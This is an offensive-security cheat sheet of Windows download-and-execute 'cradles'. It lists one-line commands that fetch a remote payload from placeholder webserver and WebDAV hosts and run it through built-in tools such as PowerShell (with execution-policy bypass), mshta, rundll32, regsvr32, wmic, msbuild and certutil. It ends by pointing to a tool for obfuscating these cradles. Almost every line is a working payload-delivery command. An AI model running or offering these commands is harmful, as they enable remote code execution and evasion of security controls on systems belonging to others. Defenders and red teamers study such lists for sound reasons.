
>More Info about Powershell Download Cradles
	https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html

>Download & Execture Cradles
	

	Process: Powershell
	Written to DIsk?: No
		powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
		powershell -exec bypass -f \\webdavserver\folder\payload.ps1

	Process: Cmd
		cmd.exe /k < \\webdavserver\folder\batchfile.txt

	Process: Cscript/Wscript
		cscript //E:jscript \\webdavserver\folder\payload.txt

	Process: Mshta
		mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
		mshta http://webserver/payload.hta
		mshta \\webdavserver\folder\payload.hta

	Process: Rundll32
		rundll32 \\webdavserver\folder\payload.dll,entrypoint
		rundll32.exe 
				javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();

	Process: Wmic
		wmic os get /format:"https://webserver/payload.xsl"

	Process: Regasm/Regsvc
		C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll

	Process: Regsvr32
		regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
		regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll

	Process: Odbconf
		odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}

	Process: Msbuild
		cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"	

>Combining some commands

	certutil -urlcache -split -f http://webserver/payload payload

	certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll

>Other

Invoke-CradleCrafter allows for obfusgation of the DownloadCradle , adding to confusion even more.
